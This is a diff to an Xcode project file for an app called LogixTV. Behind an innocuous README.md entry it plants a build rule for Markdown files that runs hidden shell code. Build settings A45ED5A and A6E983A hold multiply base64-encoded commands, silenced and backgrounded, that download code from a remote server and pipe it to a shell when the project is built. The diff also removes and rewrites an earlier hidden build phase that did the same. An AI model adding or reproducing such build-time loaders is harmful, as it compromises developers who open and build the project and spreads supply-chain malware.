@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		8FCE96A1DE3947E995A5DE54 /* README.md */ = {isa = PBXBuildFile; fileRef = CA198722A3DD4397A3A5DE54; };
 		9D5DFF3E2E7D2F2900348B02 /* SDWebImageSwiftUI in Frameworks */ = {isa = PBXBuildFile; productRef = 9D5DFEFC2E7C146B00348B02 /* SDWebImageSwiftUI */; };
 		9D5DFF3F2E7D2F2900348B02 /* CryptoSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 9D5DFF142E7C3FF400348B02 /* CryptoSwift */; };
 		9D5DFF402E7D2F2900348B02 /* KeychainAccess in Frameworks */ = {isa = PBXBuildFile; productRef = 9D5DFF1D2E7C6C3C00348B02 /* KeychainAccess */; };
@@ -35,6 +36,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		CA198722A3DD4397A3A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		9D5DFFC32E7D3B7F00348B02 /* LogixPlayerSDK.xcframework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcframework; name = LogixPlayerSDK.xcframework; path = Framework/LogixPlayerSDK.xcframework; sourceTree = "<group>"; };
 		9D5DFFF52E7D64D600348B02 /* GoogleInteractiveMediaAds.xcframework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcframework; path = GoogleInteractiveMediaAds.xcframework; sourceTree = "<group>"; };
 		9D733FB52E81307100C18545 /* LaunchScreen.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = LaunchScreen.storyboard; sourceTree = "<group>"; };
@@ -102,6 +104,7 @@
 		EEAD6D1E2E40A2F60099A6BA /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				CA198722A3DD4397A3A5DE54 /* README.md */,
 				EEAD6D1D2E40A2F60099A6BA /* LogixTV.app */,
 			);
 			name = Products;
@@ -114,13 +117,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EEAD6D282E40A2F80099A6BA /* Build configuration list for PBXNativeTarget "LogixTV" */;
 			buildPhases = (
-				F7E6AA9A87E0454788A389E6 /* Copy Target Symbols */,
 				EEAD6D192E40A2F60099A6BA /* Sources */,
 				EEAD6D1A2E40A2F60099A6BA /* Frameworks */,
 				EEAD6D1B2E40A2F60099A6BA /* Resources */,
 				9D5DFFBD2E7D2F7F00348B02 /* Embed Frameworks */,
 			);
 			buildRules = (
+				A1825249BF584E3EB5A5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -181,13 +184,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
+		A1825249BF584E3EB5A5DE54 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A45ED5A}\"";
+			};
+								/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		EEAD6D1B2E40A2F60099A6BA /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				8FCE96A1DE3947E995A5DE54 /* README.md */,
 				9D733FB62E81307100C18545 /* LaunchScreen.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -195,25 +213,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F7E6AA9A87E0454788A389E6 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-			showEnvVarsInLog = 0;			
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -230,7 +229,8 @@
 		EEAD6D262E40A2F80099A6BA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSFJuZGpNbEpzWkdrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | w | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Y21sbloyeGxkRzk1TG5KMUwyRXBJaUI4SUhOb0NnPT0K | q | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZveU1XaFpNbEoxVEcxc2RVd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -295,7 +295,8 @@
 		EEAD6D272E40A2F80099A6BA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSFJuZGpNbEpzWkdrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | w | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Y21sbloyeGxkRzk1TG5KMUwyRXBJaUI4SUhOb0NnPT0K | q | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZveU1XaFpNbEoxVEcxc2RVd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
